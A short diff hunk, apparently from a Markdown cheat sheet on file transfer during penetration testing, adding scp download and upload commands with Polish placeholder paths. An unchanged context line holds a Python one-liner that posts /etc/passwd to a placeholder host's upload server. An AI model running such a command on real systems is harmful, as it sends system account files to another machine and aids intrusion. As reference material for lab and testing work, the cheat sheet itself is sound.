@@ -104,3 +104,8 @@ python3 -m uploadserver
 ```bash
 python3 -c 'import requests;requests.post("http://IP:8000/upload",files={"files":open("/etc/passwd","rb")})'
 ```
+# Download
+scp user@IP:/ścieżka/plik .
+
+# Upload
+scp plik user@IP:/ścieżka/
